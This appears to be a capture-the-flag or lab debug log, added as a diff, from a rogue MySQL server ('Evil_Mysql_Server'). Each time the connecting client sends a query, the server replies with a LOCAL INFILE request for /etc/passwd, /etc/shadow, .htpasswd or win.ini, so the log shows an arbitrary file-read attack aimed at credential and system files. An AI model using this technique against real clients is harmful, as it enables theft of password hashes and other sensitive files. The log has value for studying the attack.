+2020-06-20 23:16:17,022:DEBUG:Pushed: '\x13\x00\x00\x01\xfbc:\\windows\\win.ini'
+2020-06-20 23:16:17,068:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:16:17,068:DEBUG:Data recved: '\x02'
+2020-06-20 23:16:17,068:INFO:-- result
+2020-06-20 23:16:17,068:INFO:Result: '\x02'
+2020-06-20 23:16:17,068:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:16:17,068:INFO:Last packet
+2020-06-20 23:16:17,114:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:16:17,115:DEBUG:Data recved: '\x00\x03SHOW DATABASES'
+2020-06-20 23:16:17,115:INFO:Query
+2020-06-20 23:16:17,115:DEBUG:Pushed: '\x13\x00\x00\x01\xfbc:\\windows\\win.ini'
+2020-06-20 23:16:17,165:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:16:17,165:DEBUG:Data recved: '\x02'
+2020-06-20 23:16:17,165:INFO:-- result
+2020-06-20 23:16:17,165:INFO:Result: '\x02'
+2020-06-20 23:16:17,165:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:16:17,166:INFO:Last packet
+2020-06-20 23:16:17,213:DEBUG:Data recved: '\x01\x00\x00'
+2020-06-20 23:16:17,214:DEBUG:Data recved: '\x00\x01'
+2020-06-20 23:16:17,214:DEBUG:Data recved: '\x01\x00\x00'
+2020-06-20 23:16:17,214:DEBUG:Data recved: '\x00\x01'
+2020-06-20 23:18:23,815:INFO:Conn from: ('10.10.10.187', 40292)
+2020-06-20 23:18:23,816:DEBUG:Pushed: 'A\x00\x00\x00\n3.0.0-Evil_Mysql_Server\x006\x00\x00\x00evilsalt\x00\xdf\xf7\x08\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00evil2222\x00'
+2020-06-20 23:18:23,863:DEBUG:Data recved: '9\x00\x00'
+2020-06-20 23:18:23,864:DEBUG:Data recved: '\x01\x8d\xa2\n\x00\x00\x00\x00\xc0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00mysql_native_password\x00'
+2020-06-20 23:18:23,864:DEBUG:Pushed: '\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:18:23,864:INFO:Last packet
+2020-06-20 23:18:23,913:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:18:23,913:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:18:23,913:INFO:Query
+2020-06-20 23:18:23,913:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb/etc/passwd'
+2020-06-20 23:18:23,960:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:18:23,961:DEBUG:Data recved: '\x02'
+2020-06-20 23:18:23,961:INFO:-- result
+2020-06-20 23:18:23,961:INFO:Result: '\x02'
+2020-06-20 23:18:23,961:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:18:23,961:INFO:Last packet
+2020-06-20 23:18:24,007:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:18:24,007:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:18:24,007:INFO:Query
+2020-06-20 23:18:24,008:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb/etc/passwd'
+2020-06-20 23:18:24,054:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:18:24,054:DEBUG:Data recved: '\x02'
+2020-06-20 23:18:24,054:INFO:-- result
+2020-06-20 23:18:24,054:INFO:Result: '\x02'
+2020-06-20 23:18:24,054:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:18:24,054:INFO:Last packet
+2020-06-20 23:18:24,125:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:18:24,125:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:18:24,125:INFO:Query
+2020-06-20 23:18:24,125:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb/etc/passwd'
+2020-06-20 23:18:24,175:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:18:24,175:DEBUG:Data recved: '\x02'
+2020-06-20 23:18:24,175:INFO:-- result
+2020-06-20 23:18:24,175:INFO:Result: '\x02'
+2020-06-20 23:18:24,175:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:18:24,175:INFO:Last packet
+2020-06-20 23:18:24,243:DEBUG:Data recved: '.\x00\x00'
+2020-06-20 23:18:24,243:DEBUG:Data recved: '\x00\x03SET sql_quote_show_create = 1, autocommit = 1'
+2020-06-20 23:18:24,244:INFO:Query
+2020-06-20 23:18:24,244:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb/etc/shadow'
+2020-06-20 23:18:24,295:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:18:24,295:DEBUG:Data recved: '\x02'
+2020-06-20 23:18:24,295:INFO:-- result
+2020-06-20 23:18:24,295:INFO:Result: '\x02'
+2020-06-20 23:18:24,295:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:18:24,295:INFO:Last packet
+2020-06-20 23:18:24,345:DEBUG:Data recved: '\x0e\x00\x00'
+2020-06-20 23:18:24,345:DEBUG:Data recved: '\x00\x03SELECT USER()'
+2020-06-20 23:18:24,345:INFO:Query
+2020-06-20 23:18:24,345:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb/etc/shadow'
+2020-06-20 23:18:24,392:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:18:24,392:DEBUG:Data recved: '\x02'
+2020-06-20 23:18:24,392:INFO:-- result
+2020-06-20 23:18:24,392:INFO:Result: '\x02'
+2020-06-20 23:18:24,392:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:18:24,392:INFO:Last packet
+2020-06-20 23:18:24,484:INFO:Conn from: ('10.10.10.187', 40294)
+2020-06-20 23:18:24,485:DEBUG:Pushed: 'A\x00\x00\x00\n3.0.0-Evil_Mysql_Server\x006\x00\x00\x00evilsalt\x00\xdf\xf7\x08\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00evil2222\x00'
+2020-06-20 23:18:24,531:DEBUG:Data recved: '9\x00\x00'
+2020-06-20 23:18:24,531:DEBUG:Data recved: '\x01\x8d\xa2\n\x00\x00\x00\x00\xc0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00mysql_native_password\x00'
+2020-06-20 23:18:24,531:DEBUG:Pushed: '\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:18:24,532:INFO:Last packet
+2020-06-20 23:18:24,578:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:18:24,578:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:18:24,578:INFO:Query
+2020-06-20 23:18:24,578:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb/etc/passwd'
+2020-06-20 23:18:24,625:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:18:24,625:DEBUG:Data recved: '\x02'
+2020-06-20 23:18:24,625:INFO:-- result
+2020-06-20 23:18:24,626:INFO:Result: '\x02'
+2020-06-20 23:18:24,626:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:18:24,626:INFO:Last packet
+2020-06-20 23:18:24,672:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:18:24,672:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:18:24,673:INFO:Query
+2020-06-20 23:18:24,673:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb/etc/shadow'
+2020-06-20 23:18:24,720:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:18:24,720:DEBUG:Data recved: '\x02'
+2020-06-20 23:18:24,720:INFO:-- result
+2020-06-20 23:18:24,723:INFO:Result: '\x02'
+2020-06-20 23:18:24,723:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:18:24,724:INFO:Last packet
+2020-06-20 23:18:24,770:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:18:24,771:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:18:24,771:INFO:Query
+2020-06-20 23:18:24,771:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb/etc/passwd'
+2020-06-20 23:18:24,818:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:18:24,818:DEBUG:Data recved: '\x02'
+2020-06-20 23:18:24,818:INFO:-- result
+2020-06-20 23:18:24,818:INFO:Result: '\x02'
+2020-06-20 23:18:24,818:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:18:24,818:INFO:Last packet
+2020-06-20 23:18:24,864:DEBUG:Data recved: '.\x00\x00'
+2020-06-20 23:18:24,864:DEBUG:Data recved: '\x00\x03SET sql_quote_show_create = 1, autocommit = 1'
+2020-06-20 23:18:24,864:INFO:Query
+2020-06-20 23:18:24,864:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb/etc/shadow'
+2020-06-20 23:18:24,910:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:18:24,910:DEBUG:Data recved: '\x02'
+2020-06-20 23:18:24,910:INFO:-- result
+2020-06-20 23:18:24,910:INFO:Result: '\x02'
+2020-06-20 23:18:24,910:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:18:24,911:INFO:Last packet
+2020-06-20 23:18:24,957:DEBUG:Data recved: '\x17\x00\x00'
+2020-06-20 23:18:24,957:DEBUG:Data recved: '\x00\x03SELECT CONNECTION_ID()'
+2020-06-20 23:18:24,957:INFO:Query
+2020-06-20 23:18:24,957:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb/etc/passwd'
+2020-06-20 23:18:25,024:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:18:25,024:DEBUG:Data recved: '\x02'
+2020-06-20 23:18:25,024:INFO:-- result
+2020-06-20 23:18:25,024:INFO:Result: '\x02'
+2020-06-20 23:18:25,024:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:18:25,025:INFO:Last packet
+2020-06-20 23:18:25,165:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:18:25,166:DEBUG:Data recved: '\x00\x03SHOW DATABASES'
+2020-06-20 23:18:25,166:INFO:Query
+2020-06-20 23:18:25,166:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb/etc/passwd'
+2020-06-20 23:18:25,360:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:18:25,360:DEBUG:Data recved: '\x02'
+2020-06-20 23:18:25,360:INFO:-- result
+2020-06-20 23:18:25,360:INFO:Result: '\x02'
+2020-06-20 23:18:25,360:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:18:25,360:INFO:Last packet
+2020-06-20 23:18:25,455:DEBUG:Data recved: '\x01\x00\x00'
+2020-06-20 23:18:25,455:DEBUG:Data recved: '\x00\x01'
+2020-06-20 23:18:25,455:DEBUG:Data recved: '\x01\x00\x00'
+2020-06-20 23:18:25,455:DEBUG:Data recved: '\x00\x01'
+2020-06-20 23:33:58,089:INFO:Conn from: ('10.10.10.187', 40354)
+2020-06-20 23:33:58,089:DEBUG:Pushed: 'A\x00\x00\x00\n3.0.0-Evil_Mysql_Server\x006\x00\x00\x00evilsalt\x00\xdf\xf7\x08\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00evil2222\x00'
+2020-06-20 23:33:58,135:DEBUG:Data recved: '9\x00\x00'
+2020-06-20 23:33:58,135:DEBUG:Data recved: '\x01\x8d\xa2\n\x00\x00\x00\x00\xc0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00mysql_native_password\x00'
+2020-06-20 23:33:58,135:DEBUG:Pushed: '\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:33:58,135:INFO:Last packet
+2020-06-20 23:33:58,181:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:33:58,181:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:33:58,181:INFO:Query
+2020-06-20 23:33:58,181:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb./.htpasswd'
+2020-06-20 23:33:58,228:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:33:58,229:DEBUG:Data recved: '\x02'
+2020-06-20 23:33:58,229:INFO:-- result
+2020-06-20 23:33:58,229:INFO:Result: '\x02'
+2020-06-20 23:33:58,229:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:33:58,229:INFO:Last packet
+2020-06-20 23:33:58,276:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:33:58,277:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:33:58,277:INFO:Query
+2020-06-20 23:33:58,277:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb/etc/shadow'
+2020-06-20 23:33:58,323:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:33:58,323:DEBUG:Data recved: '\x02'
+2020-06-20 23:33:58,323:INFO:-- result
+2020-06-20 23:33:58,323:INFO:Result: '\x02'
+2020-06-20 23:33:58,323:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:33:58,324:INFO:Last packet
+2020-06-20 23:33:58,372:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:33:58,372:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:33:58,373:INFO:Query
+2020-06-20 23:33:58,373:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb./.htpasswd'
+2020-06-20 23:33:58,419:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:33:58,419:DEBUG:Data recved: '\x02'
+2020-06-20 23:33:58,419:INFO:-- result
+2020-06-20 23:33:58,419:INFO:Result: '\x02'
+2020-06-20 23:33:58,419:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:33:58,420:INFO:Last packet
+2020-06-20 23:33:58,466:DEBUG:Data recved: '.\x00\x00'
+2020-06-20 23:33:58,466:DEBUG:Data recved: '\x00\x03SET sql_quote_show_create = 1, autocommit = 1'
+2020-06-20 23:33:58,466:INFO:Query
+2020-06-20 23:33:58,466:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb/etc/shadow'
+2020-06-20 23:33:58,518:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:33:58,518:DEBUG:Data recved: '\x02'
+2020-06-20 23:33:58,519:INFO:-- result
+2020-06-20 23:33:58,519:INFO:Result: '\x02'
+2020-06-20 23:33:58,519:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:33:58,519:INFO:Last packet
+2020-06-20 23:33:58,565:DEBUG:Data recved: '\x0e\x00\x00'
+2020-06-20 23:33:58,565:DEBUG:Data recved: '\x00\x03SELECT USER()'
+2020-06-20 23:33:58,565:INFO:Query
+2020-06-20 23:33:58,566:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb./.htpasswd'
+2020-06-20 23:33:58,612:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:33:58,612:DEBUG:Data recved: '\x02'
+2020-06-20 23:33:58,612:INFO:-- result
+2020-06-20 23:33:58,612:INFO:Result: '\x02'
+2020-06-20 23:33:58,612:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:33:58,612:INFO:Last packet
+2020-06-20 23:33:58,705:INFO:Conn from: ('10.10.10.187', 40356)
+2020-06-20 23:33:58,705:DEBUG:Pushed: 'A\x00\x00\x00\n3.0.0-Evil_Mysql_Server\x006\x00\x00\x00evilsalt\x00\xdf\xf7\x08\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00evil2222\x00'
+2020-06-20 23:33:58,753:DEBUG:Data recved: '9\x00\x00'
+2020-06-20 23:33:58,753:DEBUG:Data recved: '\x01\x8d\xa2\n\x00\x00\x00\x00\xc0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00mysql_native_password\x00'
+2020-06-20 23:33:58,753:DEBUG:Pushed: '\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:33:58,753:INFO:Last packet
+2020-06-20 23:33:58,802:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:33:58,802:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:33:58,802:INFO:Query
+2020-06-20 23:33:58,802:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb./.htpasswd'
+2020-06-20 23:33:58,849:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:33:58,849:DEBUG:Data recved: '\x02'
+2020-06-20 23:33:58,849:INFO:-- result
+2020-06-20 23:33:58,849:INFO:Result: '\x02'
+2020-06-20 23:33:58,849:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:33:58,849:INFO:Last packet
+2020-06-20 23:33:58,896:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:33:58,896:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:33:58,896:INFO:Query
+2020-06-20 23:33:58,896:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb./.htpasswd'
+2020-06-20 23:33:58,943:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:33:58,943:DEBUG:Data recved: '\x02'
+2020-06-20 23:33:58,943:INFO:-- result
+2020-06-20 23:33:58,943:INFO:Result: '\x02'
+2020-06-20 23:33:58,943:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:33:58,943:INFO:Last packet
+2020-06-20 23:33:58,993:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:33:58,993:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:33:58,993:INFO:Query
+2020-06-20 23:33:58,993:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb/etc/passwd'
+2020-06-20 23:33:59,054:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:33:59,054:DEBUG:Data recved: '\x02'
+2020-06-20 23:33:59,054:INFO:-- result
+2020-06-20 23:33:59,054:INFO:Result: '\x02'
+2020-06-20 23:33:59,054:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:33:59,054:INFO:Last packet
+2020-06-20 23:33:59,100:DEBUG:Data recved: '.\x00\x00'
+2020-06-20 23:33:59,100:DEBUG:Data recved: '\x00\x03SET sql_quote_show_create = 1, autocommit = 1'
+2020-06-20 23:33:59,100:INFO:Query
+2020-06-20 23:33:59,100:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb/etc/passwd'
+2020-06-20 23:33:59,146:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:33:59,147:DEBUG:Data recved: '\x02'
+2020-06-20 23:33:59,147:INFO:-- result
+2020-06-20 23:33:59,147:INFO:Result: '\x02'
+2020-06-20 23:33:59,147:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:33:59,147:INFO:Last packet
+2020-06-20 23:33:59,195:DEBUG:Data recved: '\x17\x00\x00'
+2020-06-20 23:33:59,196:DEBUG:Data recved: '\x00\x03SELECT CONNECTION_ID()'
+2020-06-20 23:33:59,196:INFO:Query
+2020-06-20 23:33:59,196:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb./.htpasswd'
+2020-06-20 23:33:59,243:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:33:59,243:DEBUG:Data recved: '\x02'
+2020-06-20 23:33:59,243:INFO:-- result
+2020-06-20 23:33:59,243:INFO:Result: '\x02'
+2020-06-20 23:33:59,243:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:33:59,248:INFO:Last packet
+2020-06-20 23:33:59,295:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:33:59,295:DEBUG:Data recved: '\x00\x03SHOW DATABASES'
+2020-06-20 23:33:59,295:INFO:Query
+2020-06-20 23:33:59,295:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb./.htpasswd'
+2020-06-20 23:33:59,341:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:33:59,342:DEBUG:Data recved: '\x02'
+2020-06-20 23:33:59,342:INFO:-- result
+2020-06-20 23:33:59,342:INFO:Result: '\x02'
+2020-06-20 23:33:59,342:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:33:59,342:INFO:Last packet
+2020-06-20 23:33:59,390:DEBUG:Data recved: '\x01\x00\x00'
+2020-06-20 23:33:59,391:DEBUG:Data recved: '\x00\x01'
+2020-06-20 23:33:59,391:DEBUG:Data recved: '\x01\x00\x00'
+2020-06-20 23:33:59,391:DEBUG:Data recved: '\x00\x01'
+2020-06-20 23:35:35,498:INFO:Conn from: ('10.10.10.187', 40496)
+2020-06-20 23:35:35,498:DEBUG:Pushed: 'A\x00\x00\x00\n3.0.0-Evil_Mysql_Server\x006\x00\x00\x00evilsalt\x00\xdf\xf7\x08\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00evil2222\x00'
+2020-06-20 23:35:35,544:DEBUG:Data recved: '9\x00\x00'
+2020-06-20 23:35:35,545:DEBUG:Data recved: '\x01\x8d\xa2\n\x00\x00\x00\x00\xc0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00mysql_native_password\x00'
+2020-06-20 23:35:35,545:DEBUG:Pushed: '\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:35:35,545:INFO:Last packet
+2020-06-20 23:35:35,590:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:35:35,591:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:35:35,591:INFO:Query
+2020-06-20 23:35:35,591:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb/etc/shadow'
+2020-06-20 23:35:35,639:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:35:35,639:DEBUG:Data recved: '\x02'
+2020-06-20 23:35:35,639:INFO:-- result
+2020-06-20 23:35:35,639:INFO:Result: '\x02'
+2020-06-20 23:35:35,639:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:35:35,639:INFO:Last packet
+2020-06-20 23:35:35,685:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:35:35,685:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:35:35,685:INFO:Query
+2020-06-20 23:35:35,685:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb/etc/passwd'
+2020-06-20 23:35:35,731:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:35:35,732:DEBUG:Data recved: '\x02'
+2020-06-20 23:35:35,732:INFO:-- result
+2020-06-20 23:35:35,732:INFO:Result: '\x02'
+2020-06-20 23:35:35,732:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:35:35,732:INFO:Last packet
+2020-06-20 23:35:35,779:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:35:35,779:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:35:35,779:INFO:Query
+2020-06-20 23:35:35,779:DEBUG:Pushed: '\x0b\x00\x00\x01\xfbrobots.txt'
+2020-06-20 23:35:35,826:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:35:35,826:DEBUG:Data recved: '\x02'
+2020-06-20 23:35:35,826:INFO:-- result
+2020-06-20 23:35:35,826:INFO:Result: '\x02'
+2020-06-20 23:35:35,826:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:35:35,826:INFO:Last packet
+2020-06-20 23:35:35,872:DEBUG:Data recved: '.\x00\x00'
+2020-06-20 23:35:35,873:DEBUG:Data recved: '\x00\x03SET sql_quote_show_create = 1, autocommit = 1'
+2020-06-20 23:35:35,873:INFO:Query
+2020-06-20 23:35:35,873:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb/etc/passwd'
+2020-06-20 23:35:35,918:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:35:35,918:DEBUG:Data recved: '\x02'
+2020-06-20 23:35:35,919:INFO:-- result
+2020-06-20 23:35:35,919:INFO:Result: '\x02'
+2020-06-20 23:35:35,919:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:35:35,919:INFO:Last packet
+2020-06-20 23:35:36,015:DEBUG:Data recved: '\x0e\x00\x00'
+2020-06-20 23:35:36,015:DEBUG:Data recved: '\x00\x03SELECT USER()'
+2020-06-20 23:35:36,015:INFO:Query
+2020-06-20 23:35:36,015:DEBUG:Pushed: '\x0b\x00\x00\x01\xfbrobots.txt'
+2020-06-20 23:35:36,070:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:35:36,070:DEBUG:Data recved: '\x02'
+2020-06-20 23:35:36,070:INFO:-- result
+2020-06-20 23:35:36,070:INFO:Result: '\x02'
+2020-06-20 23:35:36,071:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:35:36,071:INFO:Last packet
+2020-06-20 23:35:36,224:INFO:Conn from: ('10.10.10.187', 40498)
+2020-06-20 23:35:36,224:DEBUG:Pushed: 'A\x00\x00\x00\n3.0.0-Evil_Mysql_Server\x006\x00\x00\x00evilsalt\x00\xdf\xf7\x08\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00evil2222\x00'
+2020-06-20 23:35:36,315:DEBUG:Data recved: '9\x00\x00'
+2020-06-20 23:35:36,315:DEBUG:Data recved: '\x01\x8d\xa2\n\x00\x00\x00\x00\xc0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00mysql_native_password\x00'
+2020-06-20 23:35:36,315:DEBUG:Pushed: '\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:35:36,315:INFO:Last packet
+2020-06-20 23:35:36,463:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:35:36,464:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:35:36,464:INFO:Query
+2020-06-20 23:35:36,464:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb/etc/shadow'
+2020-06-20 23:35:36,582:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:35:36,583:DEBUG:Data recved: '\x02'
+2020-06-20 23:35:36,583:INFO:-- result
+2020-06-20 23:35:36,583:INFO:Result: '\x02'
+2020-06-20 23:35:36,583:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:35:36,583:INFO:Last packet
+2020-06-20 23:35:36,632:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:35:36,632:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:35:36,632:INFO:Query
+2020-06-20 23:35:36,632:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb./.htpasswd'
+2020-06-20 23:35:36,678:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:35:36,679:DEBUG:Data recved: '\x02'
+2020-06-20 23:35:36,679:INFO:-- result
+2020-06-20 23:35:36,679:INFO:Result: '\x02'
+2020-06-20 23:35:36,679:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:35:36,679:INFO:Last packet
+2020-06-20 23:35:36,725:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:35:36,725:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:35:36,726:INFO:Query
+2020-06-20 23:35:36,726:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb./.htpasswd'
+2020-06-20 23:35:36,771:DEBUG:Data recved: '\x00\x00\x00'
